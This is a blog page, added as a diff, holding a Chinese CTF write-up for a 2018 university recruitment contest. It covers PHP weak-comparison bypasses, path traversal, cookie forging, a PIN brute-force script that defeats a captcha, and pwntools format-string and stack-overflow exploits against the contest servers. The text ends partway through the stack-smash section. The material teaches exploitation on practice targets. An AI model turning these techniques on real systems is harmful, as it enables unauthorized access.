@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="2018 招新赛 writeup">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sysucsa2018招新赛writeup">
+<meta property="og:url" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/index.html">
+<meta property="og:site_name" content="Waterdrop">
+<meta property="og:description" content="2018 招新赛 writeup">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web11.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web12.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web21.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web22.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web23.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/webx.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/webx1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web31.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/web32.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/misc1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/misc2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/22.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/crypto.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/9.png">
+<meta property="og:updated_time" content="2019-08-28T11:38:19.987Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sysucsa2018招新赛writeup">
+<meta name="twitter:description" content="2018 招新赛 writeup">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/28/sysucsa2018-wp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/28/sysucsa2018-wp/">
+
+
+
+
+
+  <title>sysucsa2018招新赛writeup | Waterdrop</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Waterdrop</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/28/sysucsa2018-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Waterdrop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Waterdrop">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sysucsa2018招新赛writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-28T21:22:37+08:00">
+                2018-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>2018 招新赛 writeup<br><a id="more"></a></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>上过<code>bugkuCTF</code>的朋友就知道这道题其实就是他们的签到题啦，一开始我也被这个滑稽的网页惊到了hhh</p>
+<p>为了给大家增加一点愉悦的气氛就设置了这个签到题啦</p>
+<img src="/2018/09/28/sysucsa2018-wp/1.png">
+<p>打开页面是无数铺面而来的滑稽脸</p>
+<p>直接按<code>F12</code>查看源代码就可以看到<code>flag</code>啦</p>
+<img src="/2018/09/28/sysucsa2018-wp/2.png">
+<h3 id="fake-md5-collision"><a href="#fake-md5-collision" class="headerlink" title="fake md5 collision"></a>fake md5 collision</h3><p>这题也是一个<code>CTF</code>中一个非常基础的问题了</p>
+<p>一打开网站发现需要输入两个字符串，上面一句提示让我们去看源码，那就直接F12源码呗</p>
+<img src="/2018/09/28/sysucsa2018-wp/3.png">
+<p>这里有一段注释的代码，大意就是输入两个不同的字符串，但是这两个字符串要有相同的md5值，也就是说构造一个md5碰撞咯，但是仔细看看题目是<code>fake md5 collision</code>，说明肯定还有其他办法的啦。</p>
+<p>在这里先补充一下<code>php</code>弱类型的一些基础知识：</p>
+<p>在php中是有两种判断相等的比较符号的：== 和 ===</p>
+<blockquote>
+<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
+<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
+</blockquote>
+<p>问题就出在这个==的比较上了，如果比较的字符串是<code>0e</code>开头的话，那么这个字符串就会被识别成科学记数法，无论后面的数字是什么都会被视作0，所以利用这个特点就可以进行绕过了。</p>
+<p>下面给出几个<code>MD5</code>值是<code>0e</code>开头的字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure>
+<p>随便拿其中两个的输入就能拿到flag了。</p>
+<img src="/2018/09/28/sysucsa2018-wp/4.png">
+<p>另外我们还可以利用MD5函数的特点，如果传入的a和b不是字符串而是其他的数据类型，那么MD5函数就会返回NULL。那么<code>NULL == NULL</code>也是true，同样满足了条件，可以获取到flag</p>
+<h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><img src="/2018/09/28/sysucsa2018-wp/6.png">这题点击**key在这里哦**之后直接到了另外一个页面
+
+<img src="/2018/09/28/sysucsa2018-wp/7.png">
+<p>注意到这个页面的地址与链接中的地址不一致，说明中间有页面跳转。</p>
+<p>知道这个之后直接使用BurpSuite进行截取中间跳转的那个页面即可拿到flag。</p>
+<img src="/2018/09/28/sysucsa2018-wp/5.png">
+<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>这题点开一看都是各种颜文字肯定一脸懵逼，直接百度<code>AAencode</code>就会发现这个是<code>JS</code>的一个变种，直接复制到控制台运行即可。</p>
+<img src="/2018/09/28/sysucsa2018-wp/8.png">
+<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><ul>
+<li><code>robots.txt</code>是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</li>
+<li>因此在做web题时，看一看<code>robots.txt</code>文件是必要的</li>
+<li>发现惊喜：</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web11.png"></li>
+<li>访问得到flag</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web12.png">
+</li>
+</ul>
+<h3 id="My-sercet-word"><a href="#My-sercet-word" class="headerlink" title="My sercet word"></a>My sercet word</h3><ul>
+<li>访问网站，查看3时发现提示<code>shh, the flag is in flag.php</code></li>
+<li>尝试直接访问<code>flag.php</code>，发现有保护</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web21.png"></li>
+<li>猜测网站可能存在路径穿越漏洞，尝试在搜索框输入<code>../flag.php</code></li>
+<li><code>flag.php</code>成功被包含</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web22.png"></li>
+<li>同时我们也可以尝试包含其它的文件，甚至是<code>index.php</code></li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web23.png">
+</li>
+</ul>
+<h3 id="Web-x"><a href="#Web-x" class="headerlink" title="Web-x"></a>Web-x</h3><h4 id="出题人"><a href="#出题人" class="headerlink" title="出题人"></a>出题人</h4><p>进去一看发现啥都没有，一看<code>cookies</code>除了<code>PHPSESSID</code>还有个<code>sess</code>，注意到是<code>base64</code>，解码后发现是<code>php</code>序列化数据，将<code>admin</code>键对应的<code>boolean</code>值设为<code>1</code>，编码后作为<code>sess</code>进入第二阶段。<br>提示到有个4位数字的PIN码发送到了手机，只有<code>4</code>位已经是明示爆破了，然后编写脚本在爆破的时候过验证码。<br><img src="/2018/09/28/sysucsa2018-wp/webx.png"><br>爆破的脚本供参考<br><img src="/2018/09/28/sysucsa2018-wp/webx1.png"><br>成功后会拿到一个<code>webshell</code>，<code>cat /flag</code>获取<code>flag</code>。</p>
+<h4 id="zfl"><a href="#zfl" class="headerlink" title="zfl"></a>zfl</h4><ul>
+<li>首先查看<code>cookies</code>，发现是<code>base64</code>编码，解码后发现是一个<code>php</code>序列化对象，<code>a:1:{s:5:&quot;admin&quot;;b:0;}</code></li>
+<li>修改<code>admin</code>为1后，<code>base64</code>编码，修改<code>cookies</code>，得到下一个页面</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web31.png"></li>
+<li>发现需要输入PIN和验证码，验证码可以写脚本自动计算，PIN需要爆破</li>
+<li>脚本如下：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://sysucsa.me:8080/index.php"</span></span><br><span class="line"></span><br><span class="line">admin_cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'3f4a466a44e7413c5336afe8ed2c3676'</span>, <span class="string">'sess'</span>:<span class="string">'YToxOntzOjU6ImFkbWluIjtiOjE7fQ=='</span>&#125;</span><br><span class="line"><span class="keyword">for</span> tri <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resg = requests.get(url, cookies = admin_cookies)</span><br><span class="line">        rs = resg.text</span><br><span class="line">        rs = rs[rs.find(<span class="string">'="captcha" placeholder='</span>):]</span><br><span class="line">        rs = rs[<span class="number">23</span>:]</span><br><span class="line">        rs = rs[:rs.find(<span class="string">'\n'</span>)]</span><br><span class="line">        rs = rs[:<span class="number">-1</span>]</span><br><span class="line">        rs = rs.split(<span class="string">'+'</span>)</span><br><span class="line">        res_num = int(rs[<span class="number">0</span>]) + int(rs[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># print resg.text</span></span><br><span class="line">        <span class="comment"># print rs, res_num</span></span><br><span class="line">        mdata = &#123;<span class="string">'key'</span>:tri, <span class="string">'captcha'</span>:res_num&#125;</span><br><span class="line">        resp = requests.post(url, cookies = admin_cookies, data = mdata)</span><br><span class="line">        <span class="keyword">print</span> resp.text</span><br><span class="line">        <span class="keyword">if</span> resp.text.find(<span class="string">'not correct.'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+]Done!!! key:"</span> + str(tri)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-]Fail key:"</span> + str(tri)</span><br><span class="line">    <span class="keyword">except</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[!]connection fail!"</span></span><br><span class="line">        tri -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用爆破得到的PIN，发现进入一个<code>shell</code></li>
+<li>找找<code>flag</code>，cat一下</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/web32.png">
+</li>
+</ul>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Misc-签到题"><a href="#Misc-签到题" class="headerlink" title="Misc 签到题"></a>Misc 签到题</h3><p>V1hwT2MyVnRVbGhVYm5CYVYwaE9ORnBGV1RWak1 rMTRUMWh3VGxKcWJITldWRXBIVGxkYVVsQlVNRDA9</p>
+<p><code>base 64</code> 解码</p>
+<h3 id="more-png"><a href="#more-png" class="headerlink" title="more png"></a>more png</h3><ul>
+<li>基础知识：png文件元数据</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/misc1.png"></li>
+<li>图像残缺，说明可能是元数据的height被修改</li>
+<li>用winhex或010editor打开，修复之</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/misc2.png">
+</li>
+</ul>
+<h3 id="python-是世界上最好的两种语言"><a href="#python-是世界上最好的两种语言" class="headerlink" title="python 是世界上最好的两种语言"></a>python 是世界上最好的两种语言</h3><p><code>010 editor</code> 打开 <code>PNG</code>文件头被修改<br><img src="/2018/09/28/sysucsa2018-wp/11.png"><br>修改后保存为 <code>png</code> 格式<br><img src="/2018/09/28/sysucsa2018-wp/22.png"><br>画图补全，扫描后获得网址<br><a href="www.rowtoolong.cn">www.rowtoolong.cn</a><br>得到一串十六进制文本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0A8EBA985B6300000000000000000100000040000000730D0000006400008400005A0000640100532802000000630000000003000000250000004300000073A5000000640100640200640100640300640400640100640500640600640700640800640900640A00640B00640C00640D00640E00640F00640D00641000640A00641100640D00641200641100640F00640900640D00640E00641300640C006414006415006413006414006411006416006417006725007D00006418007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100718200577C010047486400005328190000004E69530000006959000000695500000069430000006941000000697B00000069500000006935000000697400000069680000006930000000696E000000695F000000693100000069730000006932000000696500000069330000006961000000696700000069750000006921000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C616774010000006928000000002800000000730500000070792E707952030000000100000073520000000002030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301090206010D0114014E28010000005203000000280000000028000000002800000000730500000070792E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure>
+<p>保存为 <code>pyc</code> 格式，反编译</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    str = [</span><br><span class="line">        <span class="number">83</span>,</span><br><span class="line">        <span class="number">89</span>,</span><br><span class="line">        <span class="number">83</span>,</span><br><span class="line">        <span class="number">85</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">83</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">80</span>,</span><br><span class="line">        <span class="number">53</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">49</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">104</span>,</span><br><span class="line">        <span class="number">101</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">101</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">49</span>,</span><br><span class="line">        <span class="number">97</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">97</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">101</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">125</span>]</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        flag += chr(i)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>运行得到 <code>flag</code></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="F"><a href="#F" class="headerlink" title="F__"></a>F__</h3><ul>
+<li>jsFuck编码，直接放入浏览器控制台执行即可</li>
+<li><img src="/2018/09/28/sysucsa2018-wp/crypto.png">
+</li>
+</ul>
+<h3 id="摩尔斯与凯撒的约会"><a href="#摩尔斯与凯撒的约会" class="headerlink" title="摩尔斯与凯撒的约会"></a>摩尔斯与凯撒的约会</h3><p>这题嘛…提示得也是够明显了..直接解密摩尔斯电码然后再用解密凯撒密码即可，多次尝试可得偏移量为5时是<code>flag</code>。</p>
+<img src="/2018/09/28/sysucsa2018-wp/9.png">
+<p>手动加上前后大括号即可。</p>
+<p>一开始没有说清楚格式稍微坑了下…希望大家谅解hhh</p>
+<h3 id="I-wanna-be-modern"><a href="#I-wanna-be-modern" class="headerlink" title="I wanna be modern"></a>I wanna be modern</h3><p><code>DES</code></p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>右转出题人 <a href="https://blog.csdn.net/ChrysanthemumZhao/article/details/82826552" target="_blank" rel="noopener">博客</a> </p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><p>直接 <code>nc</code> 连上服务器，<code>cat flag</code> 就可以。<br>不清楚的麻烦搜搜 <code>nc</code> 和 <code>cat</code> 命令</p>
+<h3 id="format-string"><a href="#format-string" class="headerlink" title="format string"></a>format string</h3><p>利用格式化字符串修改栈内存。<br>具体可以看看<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/#_9" target="_blank" rel="noopener">ctf-wiki</a> 的利用步骤，本题只是修改了偏移和数值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./pwn1')</span></span><br><span class="line">sh = remote(<span class="string">"sysucsa.me"</span>,<span class="number">5050</span>)</span><br><span class="line">num_addr = int(sh.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">payload = p32(num_addr) + <span class="string">'%096d'</span> + <span class="string">'%7$n'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>我们也可以使用 <code>pwntools</code> 中提供的 <code>fmtstr_payload</code> 具体怎么使用搜索吧…</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./pwn1')</span></span><br><span class="line">sh = remote(<span class="string">"sysucsa.me"</span>,<span class="number">5050</span>)</span><br><span class="line">num_addr = int(sh.recv(),<span class="number">16</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;num_addr:<span class="number">100</span>&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>题目很明显了，简单栈溢出，需要学习一下<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow_basic/#_6" target="_blank" rel="noopener">栈溢出原理</a> 覆盖<code>num</code>为<code>0x1234ABCD</code>就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./pwn2')</span></span><br><span class="line">r = remote(<span class="string">"sysucsa.me"</span>,<span class="number">5051</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">20</span>+p32(<span class="number">0x1234ABCD</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="smash"><a href="#smash" class="headerlink" title="smash"></a>smash</h3><p>stack smash 原理请看：<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener"> ssp leak</a></p>
+<p>程序一开始会读取 <code>flag.txt</code>到 <code>bss</code> 段的 <code>buffer</code>，这个地址是固定的<br>所以我们可以覆盖 <code>argv[0]</code> 为<code>flag</code>地址，触发崩溃时直接输出 <code>flag</code><br>我们可以测试 argv[0]距离缓冲区的距离。或者暴力直接用地址全覆盖了。<br>测地址是这样：<br>首先在 main 函数入口设个断点 <code>b *0804859B</code><br>此时在输出的 context 可以看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffcf3c</span>│+<span class="number">0x00</span>: <span class="number">0xf7e1a637</span>  →  &lt;__libc_start_main+<span class="number">247</span>&gt; add esp, <span class="number">0x10</span>	 ← $esp</span><br><span class="line"><span class="number">0xffffcf40</span>│+<span class="number">0x04</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffffcf44</span>│+<span class="number">0x08</span>: <span class="number">0xffffcfd4</span>  →  <span class="number">0xffffd1cc</span>  →  <span class="string">"/home/yuuoniy/Desktop/pwn/pwn3"</span></span><br><span class="line"><span class="number">0xffffcf48</span>│+<span class="number">0x0c</span>: <span class="number">0xffffcfdc</span>  →  <span class="number">0xffffd1eb</span>  →  <span class="string">"LC_PAPER=zh_CN.UTF-8"</span></span><br></pre></td></tr></table></figure>
+<p>记下 <code>0xffffcfd4</code> ,再算一下我们输入字串的开始地址到该地址的偏移, 可以随意输入一段 <code>junk</code>,然后在内存中搜索这段 <code>junk</code>, 得到地址,这里得到 <code>0xffffcf08</code></p>
